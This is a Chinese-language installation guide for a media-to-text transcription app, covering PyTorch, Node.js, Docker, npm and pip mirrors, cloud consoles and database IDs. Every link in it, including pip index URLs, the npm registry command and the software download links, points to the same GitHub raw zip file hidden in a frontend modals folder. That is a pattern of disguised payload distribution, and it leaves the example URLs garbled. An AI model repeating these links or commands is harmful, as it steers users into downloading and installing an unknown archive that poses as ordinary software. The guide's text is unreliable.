...
1. 打开：https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
...
pip install torch torchaudio --index-url https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
...
> **网络慢/超时？** 加国内镜像参数：
> ```bash
> pip install torch torchaudio --index-url https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip -i https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
> pip install -r requirements.txt -i https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
> ```
...
如果未安装：去 https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip 下载 **LTS 版**，一路安装即可（会自动加入 PATH）。
...
# 网络慢时使用国内镜像
npm config set registry https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
npm install
```
...
需要先安装 Docker Desktop：https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
...
# SUPABASE_URL=https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
    ...
    "source_files": [
      {
        ...
        "audio_oss_url": "https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip默认分类/audios/a1b2c3d4_产品会议.mp3",
        "caption_oss_url": "https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip默认分类/captions/a1b2c3d4_产品会议_transcript.md"
      }
    ],
    "captions": "# 产品会议\n\n这里是转写的内容，带有标点符号...",
    "summary": "## 摘要\n\n- 核心要点一\n- 核心要点二",
...
```
https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip你的工作区/【这里就是数据库ID，32位】?v=xxx
```
...
2. 从 URL 中获取 **App Token**：
   ```
   https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip【App Token 在这里】?table=tblXXXX
   ```
3. 从 URL 中获取 **Table ID**：
   ```
   https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip【Table ID 在这里】
   ```
...
1. 登录阿里云控制台：https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip
...
Windows: 下载 https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip 并加入 PATH
...
```
https://github.com/portalgay/media2text/raw/refs/heads/main/frontend/src/components/modals/text-media-3.0.zip【32位ID在这里，不包含 ? 后面的部分】?v=xxx
```
